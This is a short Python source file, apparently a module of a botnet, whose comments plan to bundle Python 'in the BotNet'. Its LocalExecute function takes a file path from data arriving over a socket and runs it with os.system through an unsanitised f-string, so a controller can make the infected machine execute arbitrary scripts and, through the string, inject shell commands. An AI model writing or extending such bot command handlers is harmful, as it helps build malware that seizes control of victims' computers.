# for now we'll use a normal os.system(f'python {script}')
# later (when we compile with pyinstaller OR cxfreeze) we'll modify the command
# to execute with the python that's already bundled in the BotNet
import os


def LocalExecute(sock, data):
    filepath = b' '.join(data.split(b' ')[1:]).split(b'\n')[0].decode('utf-8')
    return _LocalExecute(sock, filepath)


def _LocalExecute(sock, filepath):
    return os.system(f'python {filepath}')
